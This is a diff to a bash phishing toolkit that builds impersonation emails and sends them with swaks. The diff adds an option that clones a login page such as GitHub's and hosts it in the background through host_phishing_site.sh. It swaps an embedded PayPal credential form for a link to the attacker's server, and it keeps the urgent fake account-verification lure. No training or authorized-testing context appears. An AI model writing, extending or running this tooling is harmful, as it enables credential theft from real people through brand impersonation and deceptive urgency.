@@ -23,11 +23,13 @@ show_usage() {
     echo -e "  -s, --scenario <type>    Type of phishing scenario (account, security, invoice, etc.)"
     echo -e "  -u, --urgency <level>    Urgency level (low, medium, high, critical)"
     echo -e "  -c, --custom <file>      Use custom HTML template file"
+    echo -e "  -w, --website <url>      URL of website to clone for phishing (e.g., https://github.com/login)"
     echo -e "  -h, --help               Display this help message"
     echo -e "\nExamples:"
-    echo -e "  $0                                      # Basic email with default template"
-    echo -e "  $0 -t \"Acme Corporation\" -s security   # Targeted security alert for Acme Corp"
-    echo -e "  $0 -c my_template.html                  # Use custom HTML template"
+    echo -e "  $0                                        # Basic email with default template"
+    echo -e "  $0 -t \"Acme Corporation\" -s security     # Targeted security alert for Acme Corp"
+    echo -e "  $0 -c my_template.html                    # Use custom HTML template"
+    echo -e "  $0 -w https://github.com/login            # Clone GitHub login page"
     exit 1
 }
 
@@ -36,6 +38,7 @@ TARGET_INFO=""
 SCENARIO="security"
 URGENCY="high"
 CUSTOM_TEMPLATE=""
+CLONE_WEBSITE=""
 
 # Parse command line arguments
 while [[ $# -gt 0 ]]; do
@@ -54,6 +57,10 @@ while [[ $# -gt 0 ]]; do
             ;;
         -c|--custom)
             CUSTOM_TEMPLATE="$2"
+            shift 2
+            ;;
+        -w|--website)
+            CLONE_WEBSITE="$2"
             shift 2
             ;;
         -h|--help)
@@ -489,32 +496,6 @@ create_paypal_template() {
         echo "            font-size: 12px;"
         echo "            color: #666666;"
         echo "        }"
-        echo "        .login-form {"
-        echo "            border: 1px solid #ccc;"
-        echo "            padding: 20px;"
-        echo "            border-radius: 5px;"
-        echo "            background-color: #fff;"
-        echo "            margin: 20px 0;"
-        echo "        }"
-        echo "        .form-input {"
-        echo "            width: 100%;"
-        echo "            padding: 10px;"
-        echo "            margin: 10px 0;"
-        echo "            border: 1px solid #ddd;"
-        echo "            border-radius: 4px;"
-        echo "            box-sizing: border-box;"
-        echo "        }"
-        echo "        .submit-button {"
-        echo "            background-color: #0070ba;"
-        echo "            color: white;"
-        echo "            padding: 12px 24px;"
-        echo "            border: none;"
-        echo "            border-radius: 4px;"
-        echo "            font-weight: bold;"
-        echo "            cursor: pointer;"
-        echo "            width: 100%;"
-        echo "            margin-top: 10px;"
-        echo "        }"
         echo "    </style>"
         echo "</head>"
         echo "<body>"
@@ -528,16 +509,9 @@ create_paypal_template() {
         echo "            <p>We've detected unusual activity in your PayPal account. To ensure your account security and prevent any unauthorized transactions, we need you to verify your information immediately.</p>"
         echo "            <p><strong>If you do not verify your account within 24 hours, your account will be limited and pending transactions may be canceled.</strong></p>"
         echo ""
-        echo "            <div class=\"login-form\">"
-        echo "                <h3>Please verify your PayPal account</h3>"
-        echo "                <form action=\"credentials.php\" method=\"post\">"
-        echo "                    <label for=\"email\">Email or phone number</label>"
-        echo "                    <input type=\"text\" id=\"email\" name=\"email\" class=\"form-input\" required>"
-        echo "                    <label for=\"password\">Password</label>"
-        echo "                    <input type=\"password\" id=\"password\" name=\"password\" class=\"form-input\" required>"
-        echo "                    <button type=\"submit\" class=\"submit-button\">Log In</button>"
-        echo "                </form>"
-        echo "            </div>"
+        echo "            <p style=\"text-align: center;\">"
+        echo "                <a href=\"http://${SERVER_IP}\" class=\"button\" target=\"_blank\">Verify Your Account</a>"
+        echo "            </p>"
         echo ""
         echo "            <p>If you did not initiate this request, we recommend changing your password immediately after verification.</p>"
         echo "            <p>Thank you for your prompt attention to this matter.</p>"
@@ -552,7 +526,7 @@ create_paypal_template() {
         echo "</html>"
     } > "$template_file"
     
-    echo -e "${GREEN}[SUCCESS]${NC} Generated PayPal-specific phishing email with embedded login form"
+    echo -e "${GREEN}[SUCCESS]${NC} Generated PayPal-specific phishing email"
 }
 
 # Determine which template to use
@@ -578,6 +552,27 @@ else
     # Generate default template
     generate_html_email "" "$SCENARIO" "$URGENCY" "$EMAIL_TEMPLATE"
     subject=$(generate_subject "$SCENARIO" "$URGENCY")
+fi
+
+# If a website URL was provided, set up the phishing site first
+if [ -n "$CLONE_WEBSITE" ]; then
+    echo -e "${YELLOW}[INFO]${NC} Setting up phishing site by cloning: $CLONE_WEBSITE"
+    
+    # Check if host_phishing_site.sh exists, run it with the website URL
+    if [ -f "host_phishing_site.sh" ]; then
+        chmod +x host_phishing_site.sh
+        ./host_phishing_site.sh "$CLONE_WEBSITE" &
+        PHISH_PID=$!
+        
+        # Wait a moment for the server to start
+        sleep 3
+        
+        echo -e "${GREEN}[SUCCESS]${NC} Phishing site is running in the background (PID: $PHISH_PID)"
+        echo -e "${YELLOW}[INFO]${NC} You can stop it later with: kill $PHISH_PID"
+    else
+        echo -e "${RED}[ERROR]${NC} host_phishing_site.sh not found. Please run it manually with:"
+        echo -e "./host_phishing_site.sh \"$CLONE_WEBSITE\""
+    fi
 fi
 
 # Send email using swaks with proper HTML content type
